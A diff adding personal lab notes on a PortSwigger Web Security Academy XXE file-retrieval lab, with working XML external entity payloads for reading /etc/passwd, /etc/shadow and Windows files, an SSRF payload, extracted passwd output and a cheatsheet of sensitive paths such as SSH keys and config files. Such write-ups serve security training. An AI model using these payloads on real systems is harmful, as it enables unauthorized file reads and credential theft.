@@ -1,0 +1,132 @@
+PART 1: LAB NOTES (For Personal Documentation)
+XXE Injection - File Read Lab
+Lab Details
+Lab: PortSwigger Web Security Academy - XXE with file retrieval
+
+Endpoint: POST /product/stock
+
+Content-Type: application/xml
+
+Vulnerability Type: XML External Entity (XXE) Injection
+
+Lab Setup
+
+Target: 0acd00df04fa645a80927bf900b8005b.web-security-academy.net
+Endpoint: /product/stock
+Method: POST
+Content-Type: application/xml
+Discovery Process
+Step 1: Identify XML Input
+
+Endpoint accepts XML via POST requests
+
+Application processes productId and storeId elements
+
+Response returns stock quantity
+
+Step 2: Initial Test Payload
+
+xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+Step 3: Successful Exploitation
+
+Server processed the external entity
+
+/etc/passwd file contents returned in response
+
+Vulnerability confirmed
+
+Extracted Information
+User Accounts Found:
+
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+peter:x:12001:12001:/home/peter:/bin/bash
+carlos:x:12002:12002:/home/carlos:/bin/bash
+user:x:12000:12000:/home/user:/bin/bash
+elmer:x:12099:12099:/home/elmer:/bin/bash
+academy:x:10000:10000:/academy:/bin/bash
+Syntax Notes
+Correct Entity Declaration:
+
+xml
+<!DOCTYPE root [<!ENTITY name SYSTEM "URI">]>
+Entity Reference:
+
+xml
+<element>&name;</element>
+Important Syntax Rules:
+
+Entity names cannot contain spaces
+
+Always use semicolon after entity reference
+
+DOCTYPE must come after XML declaration
+
+Root element must match application expectations
+
+Payloads Tested
+Linux File Read:
+
+xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
+Windows File Read:
+
+xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+SSRF Payload:
+
+xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/admin">]>
+Troubleshooting Notes
+Common Error 1: Duplicate Tags
+
+
+Problem: <stockCheck>...</stockCheck><storeId>3</storeId></stockCheck>
+Fix: Remove duplicate tags, ensure single root element
+Common Error 2: Missing Semicolon
+
+
+Problem: &xxe
+Fix: Use &xxe;
+Common Error 3: Wrong File Path
+
+
+Linux: /etc/passwd (no file:// prefix sometimes)
+Windows: c:/windows/win.ini (not C:\windows\win.ini)
+File Path Cheatsheet
+Linux:
+
+
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/var/www/html/config.php
+/home/[user]/.ssh/id_rsa
+/proc/self/environ
+Windows:
+
+
+c:/windows/win.ini
+c:/windows/system32/drivers/etc/hosts
+c:/inetpub/wwwroot/web.config
+Protocols Available
+
+file:// - Local file system
+http:// - HTTP requests
+https:// - HTTPS requests
+ftp:// - FTP requests
+Resource Links
+PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+
+HackTricks: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+
+OWASP: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
